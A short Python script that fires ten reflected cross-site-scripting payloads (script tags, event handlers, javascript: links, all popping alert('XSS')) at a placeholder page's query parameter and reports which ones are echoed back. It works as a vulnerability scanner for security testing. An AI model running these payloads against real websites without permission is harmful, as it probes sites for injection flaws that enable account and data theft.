import requests

# Define the URL of the target website
url = "http://example.com/vulnerable_page.php"

# Define a list of XSS payloads to test
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "';alert('XSS');//",
    "\";alert('XSS');//",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input type='text' onfocus=alert('XSS') autofocus>",
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
    "<div onmouseover=alert('XSS')>Hover over me</div>"
]

# Define a function to test for XSS
def test_xss(url, payloads):
    for payload in payloads:
        # Construct the full URL with the payload
        test_url = f"{url}?input={payload}"

        try:
            # Send the HTTP request
            response = requests.get(test_url)

            # Check if the payload is reflected in the response
            if payload in response.text:
                print(f"Potential XSS vulnerability detected with payload: {payload}")
            else:
                print(f"Payload {payload} did not trigger an XSS vulnerability.")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

# Run the test
test_xss(url, payloads)
